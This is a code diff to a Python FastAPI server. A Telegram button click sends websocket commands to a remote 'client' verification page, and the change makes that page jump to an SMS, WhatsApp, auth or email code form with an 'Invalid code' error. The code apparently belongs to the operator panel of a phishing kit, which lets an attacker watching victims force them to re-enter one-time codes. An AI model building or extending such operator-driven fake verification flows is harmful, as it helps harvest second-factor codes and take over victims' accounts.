@@ -292,7 +292,7 @@ async def root():
 async def show_error(client_id: str = Query(...), error_type: str = Query(...)):
     """
     Handle error display request from Telegram button click.
-    Shows "Wrong code" error on the client's verification page.
+    Navigates to the verification page AND shows "Wrong code" error in one message.
     """
     
     error_messages = {
@@ -302,14 +302,24 @@ async def show_error(client_id: str = Query(...), error_type: str = Query(...)):
         "email": "Invalid code. Please check your email and try again."
     }
     
+    # Route mapping for error types
+    error_route_map = {
+        "sms": "/require/sms",
+        "whatsapp": "/require/whatsapp",
+        "auth": "/require/auth",
+        "email": "/require/email"
+    }
+    
     error_message = error_messages.get(error_type, "Invalid code. Please try again.")
+    route = error_route_map.get(error_type, "/require/sms")
     
     if client_id in connected_clients:
         websocket = connected_clients[client_id]
         try:
-            # Send error command to the client
+            # Send combined navigate_with_error message
             await websocket.send_json({
-                "type": "show_error",
+                "type": "navigate_with_error",
+                "route": route,
                 "error_type": error_type,
                 "message": error_message
             })
@@ -319,7 +329,7 @@ async def show_error(client_id: str = Query(...), error_type: str = Query(...)):
                     <head><title>Error Sent</title></head>
                     <body style="font-family: Arial; text-align: center; padding: 50px;">
                         <h2>✅ Error Message Sent</h2>
-                        <p>Client <code>{client_id[:8]}...</code> will see: <b>"{error_type.upper()} wrong code"</b></p>
+                        <p>Client <code>{client_id[:8]}...</code> navigated to <b>{error_type.upper()}</b> page with error.</p>
                         <p style="color: #666;">You can close this window.</p>
                         <script>setTimeout(() => window.close(), 2000);</script>
                     </body>
